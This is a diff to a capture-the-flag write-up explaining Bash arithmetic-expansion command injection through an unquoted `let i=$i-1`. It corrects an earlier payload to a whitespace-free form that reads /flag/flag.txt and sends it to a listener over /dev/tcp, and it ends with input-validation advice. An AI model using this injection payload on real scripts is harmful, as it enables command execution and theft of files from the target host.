@@ -35,17 +35,25 @@ The nominal menu indices map to `files[1]`, `files[2]` and `files[3]`. The sensi
 
 The actual issue is `let i=$i-1`. Bash accepts variables, array references and nested arithmetic expressions, and **command substitutions embedded in arithmetic expressions** can be evaluated during expression processing. The malicious input is not evaluated as a simple integer.
 
-## 2. Recorded working payload
+## 2. The archived attempt and a verified correction
 
-The actual command from `evidence/solve_*.txt` uses an array subscript containing command substitution:
+The archived `evidence/solve_*.txt` contains an **attempted** payload:
 
 ```bash
 x[$(cat /flag/flag.txt > /dev/tcp/<listener>/4444)]
 ```
 
-The relevant Bash mechanism is **execution during arithmetic parsing**, not bypassing the later `if` or turning a failed range comparison into a successful one. The output from `cat` is redirected to a network listener, so the shell does not need to print the flag as its menu result.
+It must **not** be described as a verified working payload. The actual `server.sh` uses **unquoted** expansion in `let i=$i-1`. Spaces in this string cause shell word splitting before `let` receives its argument. A local test of the source's expression showed that the space-containing version fails with a bad array subscript, before the intended command substitution can execute. The archived text records commands but does not record successful callback output for that particular attempt.
 
-The right-hand `-1` in the original expression remains present. The final calculated index is irrelevant: the command substitution has already executed as a side effect.
+A corrected **whitespace-free** form is:
+
+```bash
+x[$(cat</flag/flag.txt>/dev/tcp/<listener>/4444)]
+```
+
+There are no literal spaces between `cat`, its input redirection and its output redirection. The expression reaches Bash's arithmetic parser as one word. Evaluating the `x[...]` array subscript executes `$(...)` as a side effect. The value that `let` ultimately assigns to `i` does not matter: the file read and redirection occur before the menu's range check.
+
+This difference was verified independently against Bash using a **harmless local filesystem side effect**: the spaced version did not create a marker, and the whitespace-free version did. Run [`scripts/verify_local.sh`](scripts/verify_local.sh) to reproduce this distinction. The original challenge's platform result was recorded as accepted, but the exact successful historical payload was not captured, so this is a validated reproduction rather than a claim about that lost command.
 
 ## 3. End-to-end challenge procedure
 
@@ -55,7 +63,7 @@ The right-hand `-1` in the original expression remains present. The final calcul
 4. Inspect the listener for the bytes of `/flag/flag.txt`.
 5. Submit the recovered flag. The server may still print an arithmetic or range error, which does not invalidate the earlier side effect.
 
-The exact field values in the public payload are masked. The supplied evidence contains the same `/dev/tcp` redirection pattern and local trial commands, and the final solved-task record confirms the accepted flag.
+The exact field values in the public payload are masked. The supplied evidence contains unsuccessful or unverified commands with the same `/dev/tcp` redirection pattern; the final solved-task summary independently records an accepted flag.
 
 ## 4. Why it works even when the menu rejects the input
 
@@ -65,7 +73,7 @@ This is a general lesson about command execution embedded in an expression parse
 
 ## 5. Reproduction note and defense
 
-The source file shown above is shipped with the challenge, and the exploit's textual form appears in the archived `evidence`. The full interactive transcript from the successful run was not saved in the ZIP, so this writeup cites the mechanism and command without inventing a specific socket log.
+The source file shown above is shipped with the challenge, and the attempted input appears in the archived `evidence`, whereas the corrected whitespace-free form was validated locally. The full interactive transcript from the successful run was not saved in the ZIP, so this writeup cites the mechanism and command without inventing a specific socket log.
 
 Use strict decimal-digit validation on input **before** arithmetic evaluation. For a three-option menu, a plain `case` statement operating on exact strings `0`, `1` and `2` is safer than accepting a user-supplied arithmetic expression.
 
